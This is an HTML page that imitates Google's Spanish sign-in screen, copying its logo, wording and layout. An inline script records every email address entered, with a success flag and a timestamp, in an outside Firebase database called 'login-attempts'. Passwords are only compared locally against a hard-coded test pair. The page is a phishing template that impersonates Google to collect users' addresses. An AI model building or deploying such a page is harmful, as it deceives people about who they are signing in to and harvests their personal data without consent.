<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Cuenta de Google</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <img src="https://www.gstatic.com/images/branding/product/2x/google_64dp.png" alt="Google Logo" class="google-logo">
            <h1>Iniciar sesión</h1>
            <p>Utiliza tu cuenta de Google</p>
        </div>
        <div class="login-box">
            <form id="login-form">
                <div class="input-group">
                    <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Introduce tu contraseña" required>
                </div>
                <div class="forgot-password">
                    <a href="#">¿Has olvidado la contraseña?</a>
                </div>
                <div class="button-group">
                    <button type="button" class="create-account">Crear cuenta</button>
                    <button type="submit" class="next-button">Siguiente</button>
                </div>
            </form>
            <p id="error-message" class="error-message"></p>
        </div>
        <div class="login-footer">
            <p>¿Utilizas una cuenta de una organización? <a href="#">Accede a la ayuda</a></p>
        </div>
    </div>
    <script type="module">
        // Importar las funciones necesarias de Firebase
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-firestore.js";
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";

        // Configurar Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyBEWPP5MEi7TD5VTZkp7my1VztTcSEx-KE",
            authDomain: "login-attempts-9606c.firebaseapp.com",
            projectId: "login-attempts-9606c",
            storageBucket: "login-attempts-9606c.firebasestorage.app",
            messagingSenderId: "663920712947",
            appId: "1:663920712947:web:ad71401e5dc108a5d2eb86"
        };

        // Inicializar Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Función para registrar un intento de inicio de sesión
        async function registerLoginAttempt(email, success) {
            try {
                // Guardar el intento de inicio de sesión en Firestore
                await addDoc(collection(db, "login_attempts"), {
                    email: email,
                    success: success,
                    timestamp: new Date()  // Guardar la fecha y hora del intento
                });
                console.log("Intento registrado correctamente en Firestore.");
            } catch (e) {
                console.error("Error al registrar el intento de inicio de sesión: ", e);
            }
        }

        // Función para manejar el envío del formulario de inicio de sesión
        document.getElementById("login-form").addEventListener("submit", async function(event) {
            event.preventDefault(); // Prevenir el comportamiento por defecto del formulario

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Simular validación de inicio de sesión (aquí puedes añadir tu propia lógica de autenticación)
            if (email === "test@example.com" && password === "123456") {
                // Si las credenciales son correctas, registramos un intento exitoso
                await registerLoginAttempt(email, true);
                window.location.href = "welcome.html"; // Redirigir a una página de bienvenida
            } else {
                // Si las credenciales son incorrectas, mostramos un mensaje de error
                document.getElementById("error-message").textContent = "Correo electrónico o contraseña incorrectos.";
                await registerLoginAttempt(email, false); // Registrar un intento fallido
            }
        });
    </script>
</body>
</html>
